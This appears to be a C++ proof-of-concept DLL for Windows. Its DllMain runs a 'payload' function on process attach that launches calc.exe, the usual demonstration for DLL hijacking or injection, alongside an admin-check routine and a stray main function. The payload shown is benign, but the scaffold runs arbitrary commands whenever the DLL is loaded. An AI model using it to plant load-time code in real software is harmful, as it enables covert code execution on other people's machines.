#include "pch.h"
#include <windows.h>
#include <iostream>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <winreg.h>


bool is_admin() {
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            return elevation.TokenIsElevated;
        }
    }
    return false;
}


int main() {
    if (!is_admin()) {
        std::cout << "[-] run the program as admin. press enter to dismiss.\n";
        system("pause");
        return 0;
    }
}

void payload() {

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    char cmd[] = "calc.exe";

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    HANDLE t;
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            payload();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
